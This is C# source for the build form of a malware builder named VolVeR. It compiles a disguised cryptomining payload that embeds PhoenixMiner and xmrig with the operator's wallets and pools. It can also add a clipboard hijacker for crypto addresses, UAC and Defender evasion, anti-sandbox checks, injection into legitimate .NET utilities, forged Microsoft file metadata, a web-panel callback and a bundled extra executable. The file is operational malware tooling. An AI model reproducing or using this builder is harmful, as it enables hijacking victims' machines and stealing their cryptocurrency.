using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Windows.Forms;

namespace VolVeRBuilder.Forms.Build
{
    public partial class Build : Form
    {
        public Build()
        {
            InitializeComponent();
        }
        private void textBox1_Leave(object sender, EventArgs e)
        {
            if (textBox10.Text.Length == 0)
            {
                textBox10.Text = "Title";
                textBox10.ForeColor = SystemColors.GrayText;
            }
            if (textBox1.Text.Length == 0)
            {
                textBox1.Text = "Description";
                textBox1.ForeColor = SystemColors.GrayText;
            }
            if (textBox2.Text.Length == 0)
            {
                textBox2.Text = "Company";
                textBox2.ForeColor = SystemColors.GrayText;
            }
            if (textBox4.Text.Length == 0)
            {
                textBox4.Text = "Product";
                textBox4.ForeColor = SystemColors.GrayText;
            }
            if (textBox3.Text.Length == 0)
            {
                textBox3.Text = "Copyright";
                textBox3.ForeColor = SystemColors.GrayText;
            }
            if (textBox5.Text.Length == 0)
            {
                textBox5.Text = "Trademark";
                textBox5.ForeColor = SystemColors.GrayText;
            }
            if (textBox6.Text.Length == 0)
            {
                textBox6.Text = "Url web panel";
                textBox6.ForeColor = SystemColors.GrayText;
            }
            if (textBox7.Text.Length == 0)
            {
                textBox7.Text = "File resources";
                textBox7.ForeColor = SystemColors.GrayText;
            }
        }

        private void Build_Load(object sender, EventArgs e)
        {
            textBox1.Text = Properties.Settings.Default.Config6;
            textBox2.Text = Properties.Settings.Default.Config2;
            textBox3.Text = Properties.Settings.Default.Config3;
            textBox4.Text = Properties.Settings.Default.Config4;
            textBox5.Text = Properties.Settings.Default.Config5;
            textBox10.Text = Properties.Settings.Default.Config1;
            textBox6.Text = Properties.Settings.Default.textpanel;
            textBox7.Text = Properties.Settings.Default.downloadstring;
            if (Properties.Settings.Default.ChekBox8 == "YES")
            {
                checkBox1.Checked = true;
            }
            if (Properties.Settings.Default.downloadchek == "YES")
            {
                checkBox3.Checked = true;
            }
            if (Properties.Settings.Default.ChekBox9 == "YES")
            {
                checkBox2.Checked = true;
            }
            this.textBox10.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox1.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox2.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox4.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox3.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox5.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox6.Leave += new System.EventHandler(this.textBox1_Leave);
            this.textBox7.Leave += new System.EventHandler(this.textBox1_Leave);
            if (textBox10.Text.Length == 0)
            {
                textBox10.Text = "Title";
                textBox10.ForeColor = Color.Gray;
            }
            if (textBox1.Text.Length == 0)
            {
                textBox1.Text = "Description";
                textBox1.ForeColor = Color.Gray;
            }
            if (textBox2.Text.Length == 0)
            {
                textBox2.Text = "Company";
                textBox2.ForeColor = Color.Gray;
            }
            if (textBox4.Text.Length == 0)
            {
                textBox4.Text = "Product";
                textBox4.ForeColor = Color.Gray;
            }
            if (textBox3.Text.Length == 0)
            {
                textBox3.Text = "Copyright";
                textBox3.ForeColor = Color.Gray;
            }
            if (textBox5.Text.Length == 0)
            {
                textBox5.Text = "Trademark";
                textBox5.ForeColor = Color.Gray;
            }
            if (textBox6.Text.Length == 0)
            {
                textBox6.Text = "Url web panel";
                textBox6.ForeColor = Color.Gray;
            }
            if (textBox7.Text.Length == 0)
            {
                textBox7.Text = "File resources";
                textBox7.ForeColor = Color.Gray;
            }
        }

        private void FormIsClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.Config1 = textBox10.Text;
            Properties.Settings.Default.Config2 = textBox2.Text;
            Properties.Settings.Default.Config3 = textBox3.Text;
            Properties.Settings.Default.Config4 = textBox4.Text;
            Properties.Settings.Default.Config5 = textBox5.Text;
            Properties.Settings.Default.Config6 = textBox1.Text;
            Properties.Settings.Default.textpanel = textBox6.Text;
            Properties.Settings.Default.downloadstring = textBox7.Text;
            if (checkBox1.Checked == true)
            {
                Properties.Settings.Default.ChekBox8 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox8 = "NO";
            }
            if (checkBox2.Checked == true)
            {
                Properties.Settings.Default.ChekBox9 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox9 = "NO";
            }
            if (checkBox3.Checked == true)
            {
                Properties.Settings.Default.downloadchek = "YES";
            }
            else
            {
                Properties.Settings.Default.downloadchek = "NO";
            }
            Properties.Settings.Default.Save();

        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        string resxPath2 = "VolVeRFINAL.Properties.Resources";

        private void iconButton2_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.Config1 = textBox10.Text;
            Properties.Settings.Default.Config2 = textBox2.Text;
            Properties.Settings.Default.Config3 = textBox3.Text;
            Properties.Settings.Default.Config4 = textBox4.Text;
            Properties.Settings.Default.Config5 = textBox5.Text;
            Properties.Settings.Default.Config6 = textBox1.Text;
            Properties.Settings.Default.textpanel = textBox6.Text;
            Properties.Settings.Default.downloadstring = textBox7.Text;
            if (checkBox1.Checked == true)
            {
                Properties.Settings.Default.ChekBox8 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox8 = "NO";
            }
            if (checkBox2.Checked == true)
            {
                Properties.Settings.Default.ChekBox9 = "YES";
            }
            else
            {
                Properties.Settings.Default.ChekBox9 = "NO";
            }
            if (checkBox3.Checked == true)
            {
                Properties.Settings.Default.downloadchek = "YES";
            }
            else
            {
                Properties.Settings.Default.downloadchek = "NO";
            }
            Properties.Settings.Default.Save();

            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;
            Params.ReferencedAssemblies.Add("System.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.CompilerOptions = "/unsafe";
            Params.CompilerOptions += "\n/t:winexe";




            Params.OutputAssembly = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            string Source = Properties.Resources.Program;
            string Source2 = Properties.Resources.config;
            string Source3 = Properties.Resources.Host;
            string Source4 = Properties.Resources.Analysis;
            string Source5 = Properties.Resources.Resources_Designer;

            using (var r = new ResourceWriter(Path.GetTempPath() + @"\" + resxPath2 + ".resources"))
            {


                r.AddResource("ethminer", Properties.Resources.PhoenixMiner);
                r.AddResource("xmrig", Properties.Resources.xmrig);
                if (Properties.Settings.Default.downloadchek == "YES")
                {
                    r.AddResource("iqdisakwe", File.ReadAllBytes(Properties.Settings.Default.downloadstring));
                     

                }


            }

            Params.EmbeddedResources.Add(System.IO.Path.GetTempPath() + @"\" + resxPath2 + ".resources");
            Params.ReferencedAssemblies.Add("System.Management.dll");
            Params.ReferencedAssemblies.Add("System.Core.dll");
            Params.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            Params.ReferencedAssemblies.Add("System.IO.Compression.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            // Wallets
            Source2 = Source2.Replace("mnowallet", Properties.Settings.Default.Wallet1);
            Source2 = Source2.Replace("mnopool", Properties.Settings.Default.Wallet2);
            Source2 = Source2.Replace("25", Properties.Settings.Default.Wallet3);
            Source2 = Source2.Replace("etcwallet", Properties.Settings.Default.Wallet6);
            Source2 = Source2.Replace("etcpool", Properties.Settings.Default.Wallet5);
            Source2 = Source2.Replace("etcwork", Properties.Settings.Default.Wallet4);
            Source2 = Source2.Replace("ethwallet", Properties.Settings.Default.Wallet7);
            Source2 = Source2.Replace("ethpool", Properties.Settings.Default.Wallet8);
            Source2 = Source2.Replace("ethwork", Properties.Settings.Default.Wallet9);
            // Install
            Source2 = Source2.Replace("Windows", Properties.Settings.Default.Misc6);
            Source2 = Source2.Replace("winupdater", Properties.Settings.Default.Misc5);
            Source2 = Source2.Replace("MicrosoftEdgeUpdate", Properties.Settings.Default.Misc7);
            // Clipper 
            if (Properties.Settings.Default.ChekBox1 == "YES")
            {
                Source2 = Source2.Replace("hipppr", "true");
                Source = Source.Replace("#btcclp", Properties.Settings.Default.Misc3);
                Source = Source.Replace("#etcclp", Properties.Settings.Default.Misc2);
                Source = Source.Replace("#xmrclp", Properties.Settings.Default.Misc1);
            }
            // Mutex
            Source2 = Source2.Replace("volver-pykserajobplwfm", Properties.Settings.Default.Misc4);
            // Steal Mode
            if (Properties.Settings.Default.ChekBox3 == "YES")
            {
                Source2 = Source2.Replace("uac", "true");

            }
            if (Properties.Settings.Default.ChekBox4 == "YES")
            {
                Source2 = Source2.Replace("forceuac", "true");

            }
            if (Properties.Settings.Default.ChekBox4 == "YES")
            {
                Source2 = Source2.Replace("forceder", "true");

            }
            if (Properties.Settings.Default.ChekBox6 == "YES")
            {
                Source2 = Source2.Replace("antisand", "true");

            }
            if (Properties.Settings.Default.ChekBox7 == "YES")
            {
                Source2 = Source2.Replace("debug", "true");

            }
            // Inject
            if (Properties.Settings.Default.CPU == "RegSvcs.exe")
            {
                Source = Source.Replace("#appdate", "RegSvcs.exe");

            }
            if (Properties.Settings.Default.CPU == "InstallUtil.exe")
            {
                Source = Source.Replace("#appdate", "InstallUtil.exe");
            }
            if (Properties.Settings.Default.CPU == "jsc.exe")
            {
                Source = Source.Replace("#appdate", "jsc.exe");
            }
            if (Properties.Settings.Default.CPU == "ngentask.exe")
            {
                Source = Source.Replace("#appdate", "ngentask.exe");
            }
            if (Properties.Settings.Default.CPU == "DataSvcUtil.exe")
            {
                Source = Source.Replace("#appdate", "DataSvcUtil.exe");
            }
            if (Properties.Settings.Default.CPU == "")
            {
                Source = Source.Replace("#appdate", "RegSvcs.exe");
            }
            if (Properties.Settings.Default.GPU == "")
            {
                Source = Source.Replace("#winappdate", "vbc.exe");
            }
            if (Properties.Settings.Default.GPU == "vbc.exe")
            {
                Source = Source.Replace("#winappdate", "vbc.exe");
            }
            if (Properties.Settings.Default.GPU == "AddInUtil.exe")
            {
                Source = Source.Replace("#winappdate", "AddInUtil.exe");
            }
            if (Properties.Settings.Default.GPU == "EdmGen.exe")
            {
                Source = Source.Replace("#winappdate", "EdmGen.exe");
            }
            if (Properties.Settings.Default.GPU == "aspnet_state.exe")
            {
                Source = Source.Replace("#winappdate", "aspnet_state.exe");
            }
            // Bild
            if (Properties.Settings.Default.ChekBox8 == "YES")
            {
                Source = Source.Replace("UserAccountBroker", Properties.Settings.Default.Config1);
                Source = Source.Replace("User Account Control Panel Host", Properties.Settings.Default.Config6);
                Source = Source.Replace("Microsoft® .NET Framework", Properties.Settings.Default.Config2);
                Source = Source.Replace("Microsoft® Windows® Operating System", Properties.Settings.Default.Config4);
                Source = Source.Replace("© Microsoft Corporation. All rights reserved.", Properties.Settings.Default.Config3);

            }
            // Web panel 
            if (Properties.Settings.Default.ChekBox9 == "YES")
            {
                Source2 = Source2.Replace("webphp", "true");
                Source3 = Source3.Replace("isfislalwidaq", Properties.Settings.Default.textpanel);

            }
            // Still
            if (Properties.Settings.Default.downloadchek == "YES")
            {
                Source2 = Source2.Replace("opielfele", "true");

            }
            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");  

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source, Source2, Source4, Source5, Source3.ToString());






            if (Results.Errors.Count > 0)
            {

                foreach (CompilerError err in Results.Errors)
                    MessageBox.Show(err.ToString(), "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Выводим циклом ошибки, если они есть
            }
            else
            {
                MessageBox.Show("Готово, https://t.me/VolVeRFM"); //Выводим сообщение что всё прошло успешно
            }
 

        }

        private void button2_Click(object sender, EventArgs e)
        {
            var intro = new OpenFileDialog();
            intro.Filter = "Executable |*.exe";
            if (intro.ShowDialog() == DialogResult.OK)
            {
                var info = FileVersionInfo.GetVersionInfo(intro.FileName);
                try
                {
                    textBox10.Text = info.InternalName;
                    textBox1.Text = info.FileDescription;
                    textBox2.Text = info.CompanyName;
                    textBox4.Text = info.ProductName;
                    textBox3.Text = info.LegalCopyright;
                    textBox5.Text = info.LegalTrademarks;
                }
                catch { }
            }
        }

        private void iconButton1_Click(object sender, EventArgs e)
        {
            OpenFileDialog open = new OpenFileDialog();
            open.Filter = "Server.exe |*.exe";
            if (open.ShowDialog() == DialogResult.OK)
            {
                textBox7.Text = open.FileName;
            }

        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
